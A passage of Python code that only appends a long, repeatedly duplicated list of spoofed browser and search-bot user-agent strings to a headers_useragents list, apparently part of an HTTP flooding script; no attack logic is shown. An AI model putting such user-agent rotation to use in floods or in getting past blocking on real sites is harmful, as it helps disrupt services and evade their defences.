                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
                                    	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
